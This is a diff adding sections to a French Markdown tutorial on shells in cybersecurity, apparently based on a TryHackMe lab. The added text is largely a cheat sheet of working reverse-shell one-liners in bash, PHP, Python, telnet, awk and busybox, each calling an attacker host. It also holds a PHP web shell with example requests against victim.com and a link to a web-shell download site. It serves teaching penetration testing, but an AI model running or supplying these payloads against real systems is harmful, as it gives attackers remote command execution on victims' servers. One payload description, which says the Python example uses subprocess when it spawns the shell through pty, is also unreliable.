@@ -1,3 +1,32 @@
+# Les Shells en Cybersécurité
+
+## Sommaire
+
+- [Qu'est-ce qu'un Shell ?](#quest-ce-quun-shell-)
+- [Reverse Shell](#reverse-shell)
+  - [Comment fonctionnent les Reverse Shells](#comment-fonctionnent-les-reverse-shells)
+  - [Configuration d'un écouteur Netcat](#configuration-dun-écouteur-netcat-nc)
+  - [Obtention d'un accès Reverse Shell](#obtention-dun-accès-reverse-shell)
+  - [L'attaquant reçoit le Shell](#lattaquant-reçoit-le-shell)
+- [Bind Shell](#bind-shell)
+  - [Comment fonctionnent les Bind Shells](#comment-fonctionnent-les-bind-shells)
+  - [Configuration du Bind Shell sur la Cible](#configuration-du-bind-shell-sur-la-cible)
+  - [L'attaquant se connecte au Bind Shell](#lattaquant-se-connecte-au-bind-shell)
+- [Outils d'Écoute pour Shells](#outils-découte-pour-shells)
+  - [Rlwrap](#rlwrap)
+  - [Ncat](#ncat)
+  - [Socat](#socat)
+- [Shell Payloads](#shell-payloads)
+  - [Bash](#bash)
+  - [PHP](#php)
+  - [Python](#python)
+  - [Autres](#autres)
+- [Web Shells](#web-shells)
+  - [Exemple de Web Shell PHP](#exemple-de-web-shell-php)
+  - [Web Shells existants disponibles en ligne](#web-shells-existants-disponibles-en-ligne)
+
+---
+
 # Qu'est-ce qu'un Shell ?
 
 Un shell est un logiciel qui permet à un utilisateur d'interagir avec un système d'exploitation. Il peut s'agir d'une interface graphique, mais il s'agit généralement d'une interface en ligne de commande, selon le système d'exploitation exécuté sur le système cible.
@@ -208,3 +237,183 @@ attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
 ```
 
 La commande ci-dessus utilise l'option `-d` pour activer la sortie verbeuse ; l'utiliser à nouveau (`-d -d`) augmentera la verbosité des commandes. L'option `TCP-LISTEN:443` crée un écouteur TCP sur le port 443, établissant un socket serveur pour les connexions entrantes. Enfin, l'option `STDOUT` dirige toutes les données entrantes vers le terminal.
+
+---
+
+## Shell Payloads
+
+Un Shell Payload peut être une commande ou un script qui expose le shell à une connexion entrante dans le cas d'un bind shell ou une connexion sortante dans le cas d'un reverse shell.
+
+Explorons certains de ces payloads qui peuvent être utilisés sur le système d'exploitation Linux pour exposer le shell via les reverse shells les plus populaires.
+
+### Bash
+
+#### Reverse Shell Bash Normal
+
+```bash
+target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+
+Ce reverse shell initie un shell bash interactif qui redirige l'entrée et la sortie via une connexion TCP vers l'IP de l'attaquant (ATTACKER_IP) sur le port 443. L'opérateur `>&` combine à la fois la sortie standard et l'erreur standard.
+
+#### Reverse Shell Bash Read Line
+
+```bash
+target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+
+Ce reverse shell crée un nouveau descripteur de fichier (5 dans ce cas) et se connecte à un socket TCP. Il lira et exécutera les commandes depuis le socket, renvoyant la sortie via le même socket.
+
+#### Reverse Shell Bash avec Descripteur de Fichier 196
+
+```bash
+target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+```
+
+Ce reverse shell utilise un descripteur de fichier (196 dans ce cas) pour établir une connexion TCP. Il permet au shell de lire les commandes depuis le réseau et de renvoyer la sortie via la même connexion.
+
+#### Reverse Shell Bash avec Descripteur de Fichier 5
+
+```bash
+target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+
+Similaire au premier exemple, cette commande ouvre un shell (bash -i), mais elle utilise le descripteur de fichier 5 pour l'entrée et la sortie, permettant une session interactive sur la connexion TCP.
+
+### PHP
+
+#### Reverse Shell PHP utilisant la fonction exec
+
+```bash
+target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+```
+
+Ce reverse shell crée une connexion socket vers l'IP de l'attaquant sur le port 443 et utilise la fonction exec pour exécuter un shell, redirigeant l'entrée et la sortie standard.
+
+#### Reverse Shell PHP utilisant la fonction shell_exec
+
+```bash
+target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+```
+
+Similaire à la commande précédente, mais utilise la fonction shell_exec.
+
+#### Reverse Shell PHP utilisant la fonction system
+
+```bash
+target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+```
+
+Ce reverse shell emploie la fonction system, qui exécute la commande et affiche le résultat dans le navigateur.
+
+#### Reverse Shell PHP utilisant la fonction passthru
+
+```bash
+target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+```
+
+La fonction passthru exécute une commande et renvoie la sortie brute au navigateur. C'est utile lors du travail avec des données binaires.
+
+#### Reverse Shell PHP utilisant la fonction popen
+
+```bash
+target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+```
+
+Ce reverse shell utilise popen pour ouvrir un pointeur de fichier de processus, permettant au shell d'être exécuté.
+
+### Python
+
+> **Note** : Les extraits suivants nécessitent l'utilisation de `python -c` pour s'exécuter, indiqué par l'espace réservé `PY-C`
+
+#### Reverse Shell Python en exportant des variables d'environnement
+
+```bash
+target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+
+Ce reverse shell définit l'hôte distant et le port comme variables d'environnement, crée une connexion socket et duplique le descripteur de fichier socket pour l'entrée/sortie standard.
+
+#### Reverse Shell Python utilisant le module subprocess
+
+```bash
+target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+```
+
+Ce reverse shell utilise le module subprocess pour générer un shell et configure un environnement similaire à la commande Reverse Shell Python en exportant des variables d'environnement.
+
+#### Reverse Shell Python Court
+
+```bash
+PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
+Ce reverse shell crée un socket (s), se connecte à l'attaquant et redirige l'entrée, la sortie et l'erreur standard vers le socket en utilisant `os.dup2()`.
+
+### Autres
+
+#### Telnet
+
+```bash
+target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+```
+
+Ce reverse shell crée un pipe nommé en utilisant mkfifo et se connecte à l'attaquant via Telnet sur l'IP ATTACKER_IP et le port 443.
+
+#### AWK
+
+```bash
+target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+Ce reverse shell utilise les capacités TCP intégrées d'AWK pour se connecter à ATTACKER_IP:443. Il lit les commandes de l'attaquant et les exécute, puis renvoie les résultats via la même connexion TCP.
+
+#### BusyBox
+
+```bash
+target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
+```
+
+Ce reverse shell BusyBox utilise Netcat (nc) pour se connecter à l'attaquant à ATTACKER_IP:443. Une fois connecté, il exécute /bin/sh, exposant la ligne de commande à l'attaquant.
+
+---
+
+## Web Shells
+
+Un web shell est un script écrit dans un langage supporté par un serveur web compromis qui exécute des commandes via le serveur web lui-même. Un web shell est généralement un fichier contenant le code qui exécute des commandes et gère les fichiers. Il peut être caché dans une application ou un service web compromis, ce qui le rend difficile à détecter et très populaire parmi les attaquants.
+
+Les web shells peuvent être écrits dans plusieurs langages supportés par les serveurs web, comme PHP, ASP, JSP et même de simples scripts CGI.
+
+### Exemple de Web Shell PHP
+
+Examinons un exemple de web shell PHP pour comprendre comment ce processus fonctionne :
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Le shell ci-dessus peut être enregistré dans un fichier avec l'extension PHP, comme `shell.php`, puis téléchargé sur le serveur web par l'attaquant en exploitant des vulnérabilités telles que le téléchargement de fichiers non restreint, l'inclusion de fichiers, l'injection de commandes, entre autres, ou en obtenant un accès non autorisé.
+
+Après le déploiement du web shell sur le serveur, il peut être accédé via l'URL où le web shell est hébergé, dans cet exemple `http://victim.com/uploads/shell.php`. Comme nous l'avons observé dans le code de `shell.php`, nous devons fournir une méthode GET et la valeur de la variable cmd, qui doit contenir la commande que l'attaquant souhaite exécuter. Par exemple, si nous voulons exécuter la commande `whoami`, la requête à l'URL devrait être :
+
+```
+http://victim.com/uploads/shell.php?cmd=whoami
+```
+
+Ce qui précède exécutera la commande `whoami` et affichera le résultat dans le navigateur web.
+
+### Web Shells existants disponibles en ligne
+
+La puissance des langages supportés par les serveurs web peut aboutir à des web shells avec beaucoup de fonctionnalités et éviter la détection en même temps. Explorons certains des web shells les plus populaires qui peuvent être trouvés en ligne :
+
+- **p0wny-shell** - Un web shell PHP minimaliste à fichier unique qui permet l'exécution de commandes à distance.
+
+- **b374k shell** - Un web shell PHP plus riche en fonctionnalités avec gestion de fichiers et exécution de commandes, entre autres fonctionnalités.
+
+- **c99 shell** - Un web shell PHP bien connu et robuste avec des fonctionnalités étendues.
+
+Vous pouvez trouver plus de web shells sur : https://www.r57shell.net/index.php 
